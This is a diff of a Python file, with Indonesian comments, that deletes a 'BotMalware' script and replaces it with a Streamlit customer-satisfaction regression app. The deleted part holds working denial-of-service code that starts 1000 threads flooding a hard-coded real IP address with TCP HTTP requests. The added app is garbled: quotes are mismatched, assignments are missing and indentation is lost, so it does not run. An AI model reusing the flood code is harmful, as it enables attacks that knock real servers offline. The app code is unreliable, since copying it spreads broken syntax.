@@ -1,78 +1,68 @@
-import socket
-import threading
-import time
+import streamlit as st
 
-class BotMalware:
-    def __init__(self, attack_rate):
-        self.attack_rate = attack_rate
+import pandas as pd
 
-    def infect_device(self, device):
-        # Mensimulasikan infeksi perangkat
-        device.infected = True
-        print(f"Perangkat {device.id} terinfeksi")
+from sklearn.linear_model import LinearRegression
 
-    def propagate(self, network):
-        for device in network.uninfected_devices():
-            self.infect_device(device)
-            device.load_malware(self)
-            # Menyebarkan malware ke perangkat lain
-            time.sleep(1)  # Mensimulasikan waktu yang dibutuhkan untuk menyebar
+#Load dataset CSV
 
-    def launch_attack(self, target_ip, target_port):
-        def attack():
-            while True:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                try:
-                    sock.connect((target_ip, target_port))
-                    sock.send(b"GET / HTTP/1.1\r\n")
-                    # Tambahkan penanganan jika perlu
-                except socket.error as e:
-                    print(f"Socket error: {e}")
-                finally:
-                    sock.close()
-                time.sleep(1 / self.attack_rate)
+data = pd.read_csv(dataset_kepuasan.csv)
 
-        threads = []
-        for _ in range(1000):  # Jumlah thread untuk menyerang
-            thread = threading.Thread(target=attack)
-            thread.start()
-            threads.append(thread)
+#Fitur dan target
 
-        # Menunggu sampai semua thread selesai
-        for thread in threads:
-            thread.join()
+X = data[[Kecepatan_Layanan', 'Kualitas_Produk, "Harga, Kemudahan Penggunaan
 
-class Device:
-    def __init__(self, device_id):
-        self.id = device_id
-        self.infected = False
-        self.malware = None
+y=data['Target_Kepuasan]
 
-    def load_malware(self, malware):
-        self.malware = malware
+#Latih model regresi linier dari data CSV
 
-class Network:
-    def __init__(self, devices):
-        self.devices = devices
+model LinearRegression()
 
-    def uninfected_devices(self):
-        return [device for device in self.devices if not device.infected]
+model.fit(X, y)
 
-# Contoh penggunaan
-if __name__ == "__main__":
-    # Infeksi awal
-    initial_devices = [Device(1), Device(2), Device(3)]
-    malware = BotMalware(attack_rate=100)  # 100 paket per detik
+# Judul aplikasi
 
-    for device in initial_devices:
-        malware.infect_device(device)
+st.title('Prediksi Tingkat Kepuasan Pelanggan")
 
-    # Fase penyebaran
-    all_devices = initial_devices + [Device(i) for i in range(4,10)]
-    network = Network(all_devices)
-    malware.propagate(network)
+st.write("Masukkan faktor-faktor berikut untuk memperkirakan tingkat kepuasan pelanggan:)
+Input dari pengguna
 
-    # Fase serangan
-    target_ip = "103.191.63.128"  # Contoh IP target
-    target_port = 80  # Contoh port target
-    malware.launch_attack(target_ip, target_port)
+kecepatan st.slider('Kecepatan Layanan', 1, 10, 5)
+
+kualitas st.slider('Kualitas Produk', 1, 10, 7)
+
+harga st. slider('Harga', 1, 10, 5)
+
+kemudahan st.slider('Kemudahan Penggunaan', 1, 10, 6)
+
+#Membuat DataFrame input
+
+input_df = pd.DataFrame({
+
+'Kecepatan_Layanan': [kecepatan],
+
+'Kualitas_Produk': [kualitas],
+
+'Harga': [harga],
+
+'Kemudahan_Penggunaan': [kemudahan] })
+
+# Tombol untuk melakukan prediksi
+
+if st.button('Prediksi Tingkat Kepuasan'):
+
+prediksi = model.predict(input_df)[0]
+
+st. write (f'Prediksi Skor Tingkat Kepuasan: {prediksi:.2f}')
+
+# Interpretasi hasil
+
+if prediksi >= 8:
+
+tingkat = 'Sangat Puas'
+
+elif prediksi >= 6:
+
+tingkat = 'Puas'
+
+elif prediksi >= 4: tingkat = 'Cukup Puas' else: tingkat = 'Tidak Puas' st.write(f'Tingkat Kepuasan: (tingkat}')
